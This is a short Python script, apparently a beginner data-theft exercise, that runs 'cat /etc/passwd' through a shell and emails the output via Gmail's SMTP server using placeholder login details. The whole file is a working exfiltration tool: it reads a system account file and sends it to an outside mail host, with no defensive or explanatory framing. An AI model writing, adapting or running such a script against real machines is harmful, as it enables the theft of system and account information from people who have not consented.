#!/usr/bin/env python
import subprocess, smtplib


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "cat /etc/passwd"
result = subprocess.check_output(command, shell=True)
send_mail("test@gmail.com", "test", result)